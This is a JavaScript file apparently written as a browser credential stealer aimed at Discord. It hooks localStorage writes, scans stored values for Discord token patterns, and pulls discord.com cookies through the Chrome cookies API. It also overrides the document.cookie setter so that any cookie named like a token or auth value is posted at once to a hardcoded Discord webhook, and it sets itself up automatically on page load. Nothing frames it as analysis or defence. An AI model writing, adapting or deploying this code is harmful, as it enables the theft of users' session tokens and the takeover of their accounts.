// Advanced Discord Token Decryption Module
class DiscordTokenDecryptor {
    constructor() {
        this.tokens = [];
        this.encryptedData = [];
        this.browser = this.detectBrowser();
    }
    
    detectBrowser() {
        const ua = navigator.userAgent;
        if (ua.includes('Chrome')) return 'chrome';
        if (ua.includes('Firefox')) return 'firefox';
        if (ua.includes('Safari')) return 'safari';
        if (ua.includes('Edge')) return 'edge';
        return 'unknown';
    }
    
    // تقنية جديدة لفك تشفير localStorage المشفر
    async decryptEncryptedStorage() {
        // 1. Hijack localStorage methods
        const originalSetItem = localStorage.setItem;
        const originalGetItem = localStorage.getItem;
        
        // Override to capture decryption keys
        localStorage.setItem = function(key, value) {
            // Capture encryption patterns
            if (key.includes('encrypted') || key.includes('cipher')) {
                console.log('[Decryptor] Encrypted storage detected:', key);
                // Send to background for analysis
                window.postMessage({
                    type: 'ENCRYPTED_STORAGE',
                    key: key,
                    value: typeof value === 'string' ? value.substring(0, 100) : value
                }, '*');
            }
            return originalSetItem.apply(this, arguments);
        };
        
        // 2. Scan existing storage
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const value = localStorage.getItem(key);
            
            // Discord token patterns
            const discordTokenRegex = /([\w-]{24}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{84})/;
            const match = value.match(discordTokenRegex);
            
            if (match) {
                this.tokens.push({
                    source: 'localStorage',
                    key: key,
                    token: match[1],
                    fullValue: value.substring(0, 200)
                });
            }
            
            // Check for encrypted data
            if (value && (value.includes('v10') || value.includes('v11') || 
                value.includes('cipher') || value.includes('iv') || 
                value.includes('salt') || value.length > 500)) {
                this.encryptedData.push({
                    key: key,
                    preview: value.substring(0, 150),
                    length: value.length
                });
            }
        }
        
        // 3. Try to access Chrome's internal crypto (if available)
        if (this.browser === 'chrome' && window.chrome && chrome.runtime) {
            try {
                // Attempt to use chrome.cookies API
                chrome.cookies.getAll({ domain: 'discord.com' }, (cookies) => {
                    cookies.forEach(cookie => {
                        if (cookie.name.includes('token') || cookie.name.includes('auth')) {
                            this.tokens.push({
                                source: 'chrome_cookies',
                                name: cookie.name,
                                value: cookie.value,
                                domain: cookie.domain,
                                httpOnly: cookie.httpOnly
                            });
                        }
                    });
                });
            } catch (e) {
                console.log('Chrome API not accessible:', e.message);
            }
        }
        
        return {
            tokens: this.tokens,
            encrypted: this.encryptedData,
            browser: this.browser
        };
    }
    
    // Extract cookies including HTTPOnly via document.cookie override
    extractAllCookies() {
        const cookies = [];
        
        // Override document.cookie setter
        const originalCookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
        
        if (originalCookieDescriptor && originalCookieDescriptor.set) {
            Object.defineProperty(document, 'cookie', {
                get: function() {
                    return originalCookieDescriptor.get.call(this);
                },
                set: function(value) {
                    // Capture all cookie sets
                    const [name, val] = value.split('=');
                    if (name && val && (name.includes('token') || name.includes('auth'))) {
                        cookies.push({
                            name: name.trim(),
                            value: val.split(';')[0],
                            timestamp: Date.now()
                        });
                        
                        // Send to webhook immediately
                        fetch('https://discord.com/api/webhooks/1448291770218844345/3Fjw-dNqtHTdh7ou4eSpkVwE6k8vAg_b_tbh9P6OMOcv-4N-VTWXQ73OwuiEk1BlhpJD', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                content: `🍪 **Cookie Captured**: ${name}=${val.substring(0, 50)}...`
                            })
                        });
                    }
                    
                    return originalCookieDescriptor.set.call(this, value);
                }
            });
        }
        
        return cookies;
    }
}

// Auto-execute on page load
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        const decryptor = new DiscordTokenDecryptor();
        window.DiscordDecryptor = decryptor;
    });
} else {
    const decryptor = new DiscordTokenDecryptor();
    window.DiscordDecryptor = decryptor;
}